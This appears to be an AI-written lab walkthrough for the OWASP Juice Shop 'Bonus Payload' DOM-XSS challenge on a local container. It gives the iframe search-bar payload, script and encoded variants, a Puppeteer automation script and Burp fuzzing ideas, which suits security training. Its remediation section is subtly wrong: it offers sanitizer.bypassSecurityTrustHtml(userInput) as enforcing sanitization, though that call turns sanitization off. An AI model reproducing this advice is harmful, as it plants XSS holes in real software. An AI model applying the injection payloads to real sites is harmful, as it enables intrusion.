✅ TODO – Method 1: UI Search Bar Injection
DOM-Based XSS – Bonus Payload Execution via Search Input
🧭 Objective
Trigger OWASP Juice Shop’s Bonus Payload challenge by injecting a malicious <iframe> into the UI search bar, which is vulnerable to client-side DOM injection due to unsanitized rendering. This showcases exploitation via DOM sinks without server interaction.

✅ Manual Exploitation Steps
🔹 1. Start OWASP Juice Shop Container
bash
Copy
Edit
docker run --rm -p 3000:3000 bkimminich/juice-shop
--rm: Removes container after it stops

-p 3000:3000: Maps app to localhost:3000

🧠 Expected Output:

nginx
Copy
Edit
Listening on port 3000
🔧 Troubleshooting:

If port already in use: Run lsof -i :3000 and kill <PID>

🔹 2. Access the Application
Open:

arduino
Copy
Edit
http://localhost:3000
Ensure that the page loads successfully and Juice Shop is active.

🔹 3. Activate the Search Bar
Click 🔍 icon (top-right navigation bar)

Do NOT hit Enter yet

🔹 4. Inject the Payload into Search Field
Paste:

html
Copy
Edit
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076"></iframe>
⚠️ Must be one line, without whitespace corruption.

%3A is URL encoding for :

Press Enter.

🔹 5. Expected Behavior
The injected iframe should render a working SoundCloud Player.

Juice Shop will automatically recognize this and mark the Bonus Payload challenge as completed.

Verify in /#/score-board.

🧪 Payload Variations
🔸 Raw iFrame (Unencoded)
html
Copy
Edit
<iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>
🔸 HTML-Encoded Entity Variant
html
Copy
Edit
&lt;iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"&gt;&lt;/iframe&gt;
🔸 Script-based DOM Injection (Advanced)
javascript
Copy
Edit
<script>
document.write('<iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>')
</script>
🔸 DOM Mutation Observer Bypass (for triggering render callbacks)
javascript
Copy
Edit
new MutationObserver(() => alert("DOM Updated"))
.observe(document.body, { childList: true, subtree: true });
📸 POC Documentation Tasks
Capture screenshot after payload renders the SoundCloud iframe.

Store at:

bash
Copy
Edit
/poc/ui-search-bar-bonus-payload.png
Use DevTools → Elements tab to verify injection:

html
Copy
Edit
<body>
  ...
  <iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>
</body>
🧰 Automation Ideas
🧪 Burp Suite
Repeater: Send repeatable payloads to the /search parameter

Intruder: Fuzz search parameter with multiple HTML injection payloads

Logger++: Capture reflected responses and XSS rendering

DOM Invader: Map sinks like innerHTML and test for unsafe insertions

🤖 Puppeteer Script
Create an automated headless PoC test:

javascript
Copy
Edit
const puppeteer = require('puppeteer');
(async () => {
  const browser = await puppeteer.launch({headless: false});
  const page = await browser.newPage();
  await page.goto('http://localhost:3000');
  await page.click('.mat-search_icon-search'); // search icon
  await page.type('input[aria-label="Search"]', '<iframe src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>');
  await page.keyboard.press('Enter');
  await page.screenshot({ path: 'poc/ui-search-injection.png' });
})();
🔐 Remediation Recommendations
🔸 Escape User Inputs
Never inject raw user input via innerHTML.

Use .textContent or .innerText for safe rendering.

🔸 Angular Best Practice
Enforce use of DomSanitizer for any dynamic HTML content:

ts
Copy
Edit
this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
🔸 Content Security Policy (CSP)
Apply strict CSP headers:

http
Copy
Edit
Content-Security-Policy: default-src 'self'; frame-src 'none'; script-src 'self';
🔸 Additional Protections
Enable HTTP-only cookies

Set X-XSS-Protection: 1; mode=block

Enable Angular’s built-in sanitization with SecurityContext.HTML

🎯 Conclusion
This method exemplifies how client-side rendering vulnerabilities in Angular-based SPAs can be abused without interacting with the server. DOM-based XSS remains dangerous due to its silent nature, ability to bypass backend filters, and render trusted third-party content like SoundCloud iframes.

Use this as a template for further fuzzing, secure code training, and real-world exploitation validation. Let me know if you'd like this exported as a Markdown README.md or for CI/CD-based test scripting.
